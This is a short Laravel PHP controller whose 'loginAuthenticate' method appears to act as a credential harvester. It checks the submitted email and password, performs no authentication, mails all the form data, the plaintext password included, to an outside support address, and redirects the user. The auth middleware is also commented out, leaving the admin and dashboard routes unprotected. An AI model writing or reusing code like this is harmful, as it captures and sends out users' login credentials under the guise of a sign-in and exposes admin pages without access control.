<?php

namespace App\Http\Controllers;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;
use App\Mail\ContactFormMail;

class AdminController extends Controller
{
    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
       // $this->middleware('auth');
    }

    /**
     * Show the application dashboard.
     *
     * @return \Illuminate\View\View
     */
    public function index()
    {
        return view('pages.dashboard');
    }
    public function loginAuthenticate(Request $request)
    {
        // Validate the form data
        $request->validate([
            'email' => 'required|email|max:255',
            'password' => 'required|string|max:8',
        ]);

        // Send email
        $data = $request->all();
        Mail::to('support@sentiment-reviews.com')->send(new ContactFormMail($data));
        return redirect('home1');
    }

    public function admin()
    {
        return view('admin.index');
    }

}
